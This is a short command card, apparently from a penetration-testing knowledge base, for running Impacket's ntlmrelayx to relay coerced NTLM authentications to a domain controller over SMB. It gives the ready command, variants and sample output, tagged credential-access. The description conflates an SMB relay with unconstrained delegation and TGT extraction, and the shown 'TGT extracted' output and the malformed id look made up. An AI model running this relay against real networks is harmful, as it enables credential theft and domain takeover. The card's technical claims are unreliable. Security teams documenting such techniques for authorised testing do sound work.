---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: ntlmrelayx-ntlm-relay-for-tgt
type: command
executor: bash
data: 'impacket-ntlmrelayx -smb2support -t smb://$_TARGET_DC'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
tags:
  - ntlm-relay
  - credential-access
verified: true
validated: true
---

# ntlmrelayx-ntlm-relay-for-tgt

## Command

```bash
impacket-ntlmrelayx -smb2support -t smb://$_TARGET_DC
```

## Description

Starts an NTLM relay server using Impacket to intercept coerced authentications and relay them to a target SMB endpoint (e.g., domain controller) to exploit unconstrained delegation and extract TGTs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_DC | IP or hostname of the domain controller for relay (e.g., smb://192.168.1.10) | Yes |
| -smb2support | Enables SMB2 protocol support | Built-in |

## Examples

### Basic Usage

```bash
impacket-ntlmrelayx -smb2support -t smb://dc01.domain.com
```

### With Additional Options

```bash
impacket-ntlmrelayx -smb2support -t smb://$_TARGET_DC --no-http-server
```

## Expected Output

Server startup and relay success:

[*] Servers started, waiting for connections

(On authentication) [*] SMB - Received connection...
[*] Relaying to smb://dc01.domain.com
[*] TGT extracted: <base64 ticket>

## Related

- [[procedures/MS-EFSRPC-Abuse-via-PetitPotam-and-Unconstrained-Delegation]]
- [[tools/Impacket]]
